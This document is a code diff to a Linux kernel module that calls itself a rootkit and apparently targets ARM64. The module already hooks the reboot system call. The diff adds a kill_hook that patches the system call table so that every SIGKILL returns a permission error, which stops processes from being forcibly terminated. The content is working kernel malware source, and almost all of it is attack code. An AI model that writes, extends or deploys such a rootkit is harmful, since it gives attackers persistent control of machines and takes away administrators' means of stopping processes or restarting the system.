@@ -34,6 +34,7 @@ static unsigned long *sc_table;
 static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 
 static syscall_fn_t orig_reboot;
+static syscall_fn_t orig_kill;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -131,6 +132,14 @@ asmlinkage long reboot_hook(const struct pt_regs *regs)
     return orig_reboot(regs);
 }
 
+asmlinkage long kill_hook(const struct pt_regs *regs)
+{
+    if (regs->regs[1] == SIGKILL) {
+        return -EPERM;
+    }
+    return orig_kill(regs);
+}
+
 static void updateSysCallTableAccess(bool writable)
 {
     pgprot_t pgprot = writable ? PAGE_KERNEL : PAGE_KERNEL_RO;
@@ -145,6 +154,7 @@ static void unhookSysCalls(void)
     updateSysCallTableAccess(true);
 
     sc_table[__NR_reboot] = (unsigned long) orig_reboot;
+    sc_table[__NR_kill] = (unsigned long) orig_kill;
 
     updateSysCallTableAccess(false);
     hooked = false;
@@ -156,6 +166,8 @@ static void hookSysCalls(void)
 
     orig_reboot = (syscall_fn_t) sc_table[__NR_reboot];
     sc_table[__NR_reboot] = (unsigned long) reboot_hook;
+    orig_kill = (syscall_fn_t) sc_table[__NR_kill];
+    sc_table[__NR_kill] = (unsigned long) kill_hook;
 
     updateSysCallTableAccess(false);
     hooked = true;
